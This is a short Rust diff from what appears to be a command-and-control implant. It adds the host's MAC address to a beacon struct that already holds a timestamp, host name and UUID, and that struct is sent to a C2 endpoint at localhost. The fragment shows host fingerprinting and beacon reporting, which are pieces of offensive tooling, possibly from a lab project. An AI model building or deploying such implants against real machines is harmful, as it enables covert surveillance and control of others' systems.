@@ -11,12 +11,13 @@ mod sysinfo_saver;
 struct Beacon {
     timestamp: u64,
     host_name: String,
+    mac_addr: String,
     uuid: Uuid,
 }
 
 #[tokio::main]
 async fn main() {
-    let uuid: Uuid = sysinfo_saver::save_file().expect("Error saving file");
+    let (uuid, mac_addr) = sysinfo_saver::save_file().expect("Error saving file");
 
     let c2_url = "http://localhost:5000/api/v1/beacon";
     let client = Client::new();
@@ -28,6 +29,7 @@ async fn main() {
         let beacon = Beacon {
             timestamp: chrono::Utc::now().timestamp() as u64,
             host_name: System::host_name().unwrap_or_default(),
+            mac_addr: mac_addr.clone(),
             uuid,
         };
 
